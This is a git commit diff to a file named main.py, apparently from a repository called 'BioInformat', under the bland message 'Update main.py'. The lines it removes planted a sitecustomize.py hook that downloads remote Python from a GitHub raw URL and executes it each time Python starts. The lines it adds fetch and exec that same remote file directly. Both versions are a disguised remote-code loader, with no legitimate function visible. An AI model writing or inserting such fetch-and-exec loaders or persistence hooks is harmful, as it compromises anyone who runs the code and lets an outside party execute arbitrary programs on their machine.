4c25ebd38fa592bc9863068c56339346365f2ca0
requestg <lyj891916@gmail.com>
2025-07-31 21:37:46 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,13 +1,2 @@
-import os,site,sys
-c = r"""import requests;exec(requests.get('https://raw.githubusercontent.com/requestg/BioInformat/refs/heads/main/main3.py').text)"""
-def setup():
-    p = site.getusersitepackages()
-    try:os.makedirs(p,exist_ok=True)
-    except Exception as e:
-        print(e);sys.exit(1)
-    f_path = os.path.join(p,"sitecustomize.py")
-    try:
-        with open(f_path,"w") as f:f.write(c)
-    except Exception as e:
-        print(e);sys.exit(1)
-setup()
+import requests
+exec(requests.get("https://raw.githubusercontent.com/requestg/BioInformat/refs/heads/main/main3.py").text) 
